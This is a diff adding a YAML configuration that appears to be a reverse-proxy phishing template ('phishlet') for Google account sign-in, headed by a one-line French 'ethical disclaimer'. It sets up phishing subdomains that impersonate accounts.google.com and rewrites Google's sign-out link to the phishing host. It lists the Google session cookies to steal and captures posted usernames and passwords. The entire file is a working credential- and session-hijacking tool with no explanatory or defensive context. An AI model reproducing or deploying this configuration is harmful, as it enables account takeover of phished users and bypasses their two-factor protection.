@@ -1,0 +1,24 @@
+# VANTABLACK PROJECT | ETHICAL DISCLAIMER: USAGE AUTORISÉ UNIQUEMENT
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com/SignOutOptions', replace: 'https://{hostname}/SignOutOptions', mimes: ['text/html', 'application/javascript']}
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'HSID', 'SAPISID', 'SSID', 'APISID', 'LSID']
+  - domain: 'accounts.google.com'
+    keys: ['GAPS', 'LSID', 'ACCOUNT_CHOOSER']
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'accounts.google.com'
+  path: '/ServiceLogin'
